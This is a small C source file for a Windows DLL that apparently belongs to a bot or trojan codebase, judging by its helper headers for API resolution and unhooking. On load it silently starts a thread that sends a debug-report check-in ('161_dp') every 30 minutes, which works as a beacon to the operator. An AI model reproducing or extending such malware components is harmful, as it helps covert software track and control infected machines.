#include <windows.h>
#include <subauth.h>

#include "GetApi.h"
#include "BotUtils.h"
#include "Unhook.h"
#include "Memory.h"
#include "Strings.h"
#include "dprint.h"
#include "DbgRpt.h"

#pragma comment(linker, "/ENTRY:DllMain" )

DWORD WINAPI DllPingerMain(void* param)
{
	pSleep(1 * 60 * 1000);

	DebugReportInit();

	while (true)
	{
		DebugReportStepByName("161_dp");
		pSleep(30 * 60 * 1000);
	}
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hInst,DWORD Reason, PVOID Reserved)
{
	HANDLE hThread;
	switch ( Reason )
	{
		case DLL_PROCESS_ATTACH:
			hThread = (HANDLE)pCreateThread(NULL, 0, DllPingerMain, 0, 0, NULL);
			pCloseHandle(hThread);
			break;
		case DLL_THREAD_ATTACH:break;
		case DLL_THREAD_DETACH:break;
		case DLL_PROCESS_DETACH:break;
	};
	return TRUE;
};
